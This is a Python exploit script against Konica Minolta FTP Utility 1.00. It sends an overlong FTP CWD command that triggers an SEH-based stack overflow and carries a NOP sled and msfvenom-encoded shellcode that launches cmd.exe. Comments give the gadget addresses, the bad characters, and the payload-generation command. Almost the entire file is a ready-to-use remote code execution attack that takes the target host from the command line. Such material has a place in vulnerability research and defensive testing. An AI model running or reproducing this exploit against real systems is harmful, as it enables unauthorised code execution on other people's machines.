import socket
import sys

# Konica Minolta FTP Utility 1.00 CWD Command SEH Based Stack Overflow
# Author: Tyler Price

def exploit():

	print "[+] Sending Exploit..."

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((sys.argv[1], 21))

	data = s.recv(1024)

	s.send('USER anonymous' + '\r\n')

	data = s.recv(1024)

	s.send('PASS anonymous' + '\r\n')

	data = s.recv(1024)

	print data

	buffer = "A" * 1037
	buffer += "\xEB\x06\x90\x90"

	#KMFtpCM.dll
	#122010EB   5E               POP ESI
	#122010EC   5D               POP EBP
	#122010ED   C2 1000          RETN 10

	buffer += "\xEB\x10\x20\x12" 
	buffer += "\x90" * 50

	junk = "D" * 2000
	
	# BAD CHARACTERS: \x00\x0d\x0a\x3d\x5c\x2f

	# sudo msfvenom -p windows/exec cmd=cmd.exe -f c -b \x00\x0d\x0a\x3d\x5c\x2f -e x86/shikata_ga_nai -i 5 -a x86

	shellcode = ("\xbe\xe3\x07\xf8\x24\xd9\xd0\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x4c\x31\x77\x12\x03\x77\x12\x83\x24\x03\x1a\xd1\x11\x10\x4a"
"\x36\x47\xf3\xb3\x9e\xf3\x27\xb0\x7b\xd2\xee\x89\x39\xa7\x1b"
"\x15\xf0\xfd\xd4\xe5\xa9\x12\x99\x30\xd1\x9c\x4b\x9e\xf9\x89"
"\x7c\x58\x59\x3c\xc6\xbb\xc6\x3a\xd2\x51\xf8\x14\x8e\x87\x7e"
"\xde\x76\xfc\xf7\xf9\x49\xec\xac\x98\xdb\xe1\x41\x81\xf8\xca"
"\x23\x58\x53\xeb\x40\x8c\x9c\x52\x5f\x33\x24\xd8\xba\x58\x61"
"\x6c\x28\xd6\x2d\x28\xc8\x38\x91\xf3\xd8\x16\x47\x3f\x91\x38"
"\xb4\x45\x12\x9b\x0f\x8b\xf2\x21\xfe\x4a\x87\x61\x96\x19\xd4"
"\x49\x59\x3c\x02\x0e\xc0\xda\x35\x95\x6c\x8d\xa0\x7e\x71\xa1"
"\x13\x3c\xe7\xd7\x1d\x21\xef\xed\x3c\x3f\x11\xfc\xb7\x69\x68"
"\xfe\x8a\xb6\xce\x10\x4b\x25\x7c\x14\x22\xe0\xf8\xae\x13\x0c"
"\xfe\xc1\xab\xed\xf0\x9e\x1f\x7b\xbf\xcb\x96\xe5\x71\xbc\x47"
"\x30\xe5\xed\x10\xce\xc9\x35\xe0\x4c\xd7\x68\x1e\x87\x6a\x6c"
"\xba\x88\xbf\xe6\x10\x7d\xc0\xd1\x8f\x8e\x01\x5f\x62\xcb\xd5"
"\x65\x1c\xd7\x5d\x57\xbe\x6e\x32\x01\xe1\x8f\xe3\x78\xe0\x49"
"\xb7\x44\x85\x07\x15\x25\x53\x67\x4b\xa9\x31\xf8\x7d\x2b\x74"
"\x96\x08\xeb\xec\x8d\x8b\xdd\x85\xb7\xb3\xd5\xe7\xff\x82\x82"
"\x96\x2c\x92\x04\x7b\xa0\x1a\xc0\x3b\x02\xed\xd4\x3f\xc7\x11"
"\xad\x97\x51\x15\xd5\x43\xf1\xd1\x2e\x28\x44\x72\xb1\x79\x22"
"\x4d\x74\x15\xf2\xa8\x1d\xbe\xfd\x30\x68\x1d\x73\x2a\x35\xb7"
"\x8f\xf0\x51\xfd\x4a\x77\x4d\x07\xee\xce\xe9\x77")

	s.send('CWD ' + buffer + shellcode + junk + "\r\n")

	s.close()

	#KMFtpCM.dll
	#122010EB   5E               POP ESI
	#122010EC   5D               POP EBP
	#122010ED   C2 1000          RETN 10


exploit()